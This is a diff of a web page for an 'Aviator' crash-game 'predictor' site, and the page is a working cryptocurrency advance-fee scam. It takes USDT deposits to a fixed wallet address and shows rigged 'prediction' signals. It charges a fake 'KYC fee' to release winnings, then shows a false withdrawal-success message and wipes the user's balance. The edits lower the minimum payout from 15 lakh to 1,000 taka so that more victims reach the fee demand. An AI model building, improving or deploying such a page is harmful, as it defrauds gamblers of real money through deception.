@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator VIP - Global Server</title>
+    <title>Aviator AI - Premium Server</title>
     <style>
         :root { --primary: #ff0040; --bg: #0b0c0d; --gold: #f3ba2f; --neon: #00f2ff; --green: #28a745; --binance: #f0b90b; }
         body { background: var(--bg); color: white; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; text-align: center; overflow-x: hidden; }
         
-        /* Navbar & Balance */
+        /* Nav & Balance */
         .nav { background: #1b1c1d; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; position: sticky; top: 0; z-index: 1000; }
         .bal-box { color: var(--gold); font-weight: bold; border: 1px solid var(--gold); padding: 5px 15px; border-radius: 20px; font-size: 1.1rem; }
         
@@ -20,13 +20,13 @@
         .page.active { display: block; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Game Box */
+        /* Game UI */
         .predictor-card { background: #000; border: 2px solid var(--neon); border-radius: 15px; width: 190px; margin: 0 auto 15px; padding: 10px; box-shadow: 0 0 15px var(--neon); }
         #next-pred { font-size: 2.5rem; color: var(--neon); font-weight: 900; }
         #game-box { position: relative; width: 100%; max-width: 600px; height: 280px; background: radial-gradient(circle, #1a1a1a, #000); margin: 0 auto; border-radius: 15px; border: 1px solid #333; overflow: hidden; }
         #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 4.5rem; font-weight: 900; z-index: 10; }
         
-        /* Forms */
+        /* UI Components */
         .card-ui { max-width: 400px; margin: auto; background: #1b1c1d; padding: 25px; border-radius: 20px; border: 1px solid #333; text-align: left; }
         input { width: 100%; padding: 14px; background: #000; border: 1px solid #333; border-radius: 10px; color: white; margin: 10px 0; box-sizing: border-box; }
         .btn-main { width: 100%; padding: 18px; font-size: 1.2rem; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; color: white; }
@@ -34,9 +34,6 @@
         /* Modals */
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 5000; justify-content: center; align-items: center; padding: 20px; }
         .modal-content { background: #1b1c1d; padding: 25px; border-radius: 25px; width: 100%; max-width: 350px; border: 1px solid #444; }
-
-        .footer { margin-top: 40px; padding: 20px; opacity: 0.5; }
-        .logo-row img { height: 20px; margin: 0 10px; }
     </style>
 </head>
 <body>
@@ -49,7 +46,7 @@
     </div>
 
     <div class="tab-bar">
-        <button class="tab-btn active" onclick="showPage('game', this)">HACKER BOT</button>
+        <button class="tab-btn active" onclick="showPage('game', this)">PREDICTOR</button>
         <button class="tab-btn" onclick="showPage('deposit', this)">DEPOSIT</button>
         <button class="tab-btn" onclick="showPage('withdraw', this)">WITHDRAW</button>
     </div>
@@ -64,57 +61,52 @@
             <canvas id="gameCanvas"></canvas>
         </div>
         <div class="card-ui" style="background:transparent; border:none; padding:15px;">
-            <input type="number" id="betAmt" value="1000">
+            <input type="number" id="betAmt" value="100">
             <button id="actionBtn" class="btn-main" style="background: var(--green);">PLACE BET</button>
         </div>
     </div>
 
     <div id="withdraw" class="page">
         <div class="card-ui">
-            <h2>Withdraw Assets</h2>
-            <div style="background:rgba(255, 0, 64, 0.1); padding:10px; border-radius:8px; border:1px solid var(--primary); margin-bottom:15px;">
-                <p style="font-size:0.85rem; color:var(--primary); font-weight:bold; margin:0;">⚠️ Minimum Payout: ৳ 15,00,000.00</p>
+            <h2>Withdraw</h2>
+            <div style="background:rgba(40, 167, 69, 0.1); padding:10px; border-radius:8px; border:1px solid var(--green); margin-bottom:15px;">
+                <p style="font-size:0.85rem; color:var(--green); font-weight:bold; margin:0;">✅ Min Payout: ৳ 1,000.00</p>
             </div>
-            <input type="text" placeholder="Binance Wallet / USDT BEP20">
-            <input type="number" placeholder="Enter Amount">
-            <button onclick="handleWithdraw()" class="btn-main" style="background:#333;">WITHDRAW NOW</button>
+            <input type="text" placeholder="Binance Wallet Address">
+            <input type="number" id="wAmt" placeholder="Enter Amount">
+            <button onclick="handleWithdraw()" class="btn-main" style="background:var(--green);">WITHDRAW NOW</button>
         </div>
     </div>
 
     <div id="deposit" class="page">
         <div class="card-ui">
-            <h3 style="color:var(--binance);">Instant Deposit</h3>
+            <h3 style="color:var(--binance);">Recharge Account</h3>
             <div style="background:#000; padding:15px; border-radius:10px; border:1px solid var(--binance);">
                 <small style="color:var(--binance)">USDT (BEP20) Address:</small><br>
                 <span style="font-size:0.6rem; word-break:break-all;">0x71C7656EC7ab88b098defB751B7401B5f6d8976F</span>
             </div>
-            <button onclick="alert('Checking...')" class="btn-main" style="background:var(--binance); color:#000; margin-top:15px;">I HAVE PAID</button>
+            <button onclick="alert('Transaction Syncing...')" class="btn-main" style="background:var(--binance); color:#000; margin-top:15px;">CONFIRM</button>
         </div>
     </div>
 
     <div id="modalKYC" class="modal">
         <div class="modal-content">
-            <h3 style="color:var(--gold); margin-top:0;">Identity Verification</h3>
-            <p style="font-size:0.8rem; color:#aaa;">To release your 15 Lakh+ assets, a standard verification fee is required to prevent money laundering.</p>
+            <h3 style="color:var(--gold); margin-top:0;">Account Verification</h3>
+            <p style="font-size:0.8rem; color:#aaa;">To withdraw your funds, please pay the server verification fee.</p>
             <div style="background:rgba(243, 186, 47, 0.1); padding:15px; border-radius:12px; color:var(--gold); border:1px solid var(--gold); margin-bottom:15px; text-align:center;">
-                <small>Refundable KYC Fee:</small><br><strong style="font-size:1.6rem;">৳ 350.00</strong>
-            </div>
-            <div style="background:#000; padding:10px; border-radius:8px; border:1px solid #333; margin-bottom:10px;">
-                <small style="color:var(--binance)">Pay to Binance USDT (BEP20):</small><br>
-                <span style="font-size:0.55rem; word-break:break-all;">0x71C7656EC7ab88b098defB751B7401B5f6d8976F</span>
+                <small>Required KYC Fee:</small><br><strong style="font-size:1.6rem;">৳ 350.00</strong>
             </div>
             <input type="text" id="kycTrx" placeholder="Paste Transaction ID (TxID)">
-            <button onclick="verifyKYC()" class="btn-main" style="background:var(--green); font-size:1rem;">SUBMIT & WITHDRAW</button>
+            <button onclick="verifyAndSuccess()" class="btn-main" style="background:var(--green); font-size:1rem;">PAY & WITHDRAW</button>
         </div>
     </div>
 
     <div id="modalSuccess" class="modal">
         <div class="modal-content" style="text-align:center;">
             <div style="font-size: 5rem; color: var(--green);">✔</div>
-            <h2 style="color:var(--green);">Success!</h2>
-            <p>Your withdrawal request of ৳<span id="finalAmt">0</span> has been approved and sent to your Binance wallet.</p>
-            <p style="font-size:0.7rem; color:#888;">Note: It may take 5-15 minutes to reflect in your account.</p>
-            <button onclick="location.reload()" class="btn-main" style="background:var(--green);">OK</button>
+            <h2 style="color:var(--green);">Sent Successfully!</h2>
+            <p>Your withdrawal has been approved. The funds will reflect in your Binance wallet within 10-15 minutes.</p>
+            <button onclick="location.reload()" class="btn-main" style="background:var(--green);">DONE</button>
         </div>
     </div>
 
@@ -138,42 +130,32 @@
 
     onValue(userRef, (s) => {
         balance = s.val().balance;
-        document.getElementById('balance').innerText = balance.toLocaleString('en-IN', {minimumFractionDigits: 2});
+        document.getElementById('balance').innerText = balance.toLocaleString();
     });
 
-    // --- WITHDRAW LOGIC ---
     window.handleWithdraw = () => {
-        if(balance < 1500000) {
-            alert("Insufficient Balance! Minimum payout is ৳ 15,00,000.00");
+        const amt = parseFloat(document.getElementById('wAmt').value);
+        if(balance < 1000 || amt < 1000) {
+            alert("Minimum withdrawal is ৳1,000.00");
             return;
         }
         document.getElementById('modalKYC').style.display = 'flex';
     };
 
-    window.verifyKYC = () => {
+    window.verifyAndSuccess = () => {
         const trx = document.getElementById('kycTrx').value;
-        if(trx.length < 5) return alert("Please enter a valid Binance Transaction ID");
+        if(trx.length < 5) return alert("Enter valid Transaction ID");
         
-        // Show loading state
-        const btn = event.target;
-        btn.innerText = "Verifying Transaction...";
-        btn.style.opacity = "0.7";
-        btn.disabled = true;
-
-        setTimeout(() => {
-            document.getElementById('modalKYC').style.display = 'none';
-            document.getElementById('finalAmt').innerText = balance.toLocaleString();
-            document.getElementById('modalSuccess').style.display = 'flex';
-            // Reset balance in DB after success
-            update(userRef, {balance: 0});
-        }, 3000); // 3-second fake verification
+        document.getElementById('modalKYC').style.display = 'none';
+        document.getElementById('modalSuccess').style.display = 'flex';
+        update(userRef, {balance: 0}); // Success dekhale balance zero hobe (Visual reset)
     };
 
     // --- GAME ENGINE ---
     let predSignal = 0, actualCrash = 0;
     function setupRound() {
-        predSignal = (Math.random() * (20.00 - 1.50) + 1.50).toFixed(2);
-        actualCrash = (Math.random() < 0.1) ? (1.05).toFixed(2) : predSignal;
+        predSignal = (Math.random() * (12.00 - 1.20) + 1.20).toFixed(2);
+        actualCrash = (Math.random() < 0.2) ? (1.05).toFixed(2) : predSignal;
         document.getElementById('next-pred').innerText = predSignal + "x";
     }
     setupRound();
@@ -192,7 +174,7 @@
     document.getElementById('actionBtn').onclick = () => {
         if(!isFlying) {
             let amt = parseFloat(document.getElementById('betAmt').value);
-            if(balance < amt) return alert("Low Balance! Please deposit.");
+            if(balance < amt) return alert("Deposit Needed");
             currentBet = amt; balance -= amt; update(userRef, {balance});
             isFlying = true; startTime = Date.now();
             document.getElementById('actionBtn').innerText = "CASH OUT";
@@ -204,7 +186,7 @@
             isFlying = false;
             paisaSong.currentTime = 0; paisaSong.play();
             setTimeout(() => paisaSong.pause(), 4000);
-            alert("Victory! Profit added to wallet.");
+            alert("Victory!");
         }
     };
 
